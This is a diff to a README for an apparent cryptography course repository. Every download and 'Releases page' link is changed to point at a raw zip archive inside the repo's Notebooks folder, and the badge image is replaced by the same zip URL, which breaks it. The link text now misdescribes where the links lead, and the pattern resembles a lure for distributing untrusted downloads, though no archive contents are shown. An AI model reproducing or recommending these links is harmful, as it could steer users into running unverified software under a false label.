@@ -1,7 +1,7 @@
 # 💻 CTC-PESU-IO-CourseResources - Learn Cryptography with Interactive Tools
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/releases)
+[![Download](https://raw.githubusercontent.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/main/Notebooks/CTC-PESU-IO-CourseResources_1.1-alpha.2.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/main/Notebooks/CTC-PESU-IO-CourseResources_1.1-alpha.2.zip)
 
 ## 📖 Overview
 Welcome to **CTC-PESU-IO-CourseResources**. This project offers a complete course on cryptography from PESU I/O Slot 20. You will find resources ranging from classical ciphers to post-quantum cryptography. Gain hands-on experience with Capture the Flag (CTF) resources and interactive Python notebooks.
@@ -24,7 +24,7 @@ Make sure your computer meets these requirements:
 ## 📦 Download & Install
 To download the course materials, visit the Releases page:
 
-[Download Latest Release](https://github.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/main/Notebooks/CTC-PESU-IO-CourseResources_1.1-alpha.2.zip)
 
 ### 🛠️ Installation Steps
 1. **Visit the Releases Page**: Click on the link above to navigate to the Releases page.
@@ -64,4 +64,4 @@ Stay tuned for updates. We plan to expand the course with additional resources a
 ## 🎉 Acknowledgments
 Thank you for trusting *CTC-PESU-IO-CourseResources* as your guide in learning cryptography. We hope you enjoy exploring this fascinating field.
 
-For any further questions, visit the [Releases page](https://github.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/releases) and start your journey today!
+For any further questions, visit the [Releases page](https://raw.githubusercontent.com/nommichin7-a11y/CTC-PESU-IO-CourseResources/main/Notebooks/CTC-PESU-IO-CourseResources_1.1-alpha.2.zip) and start your journey today!
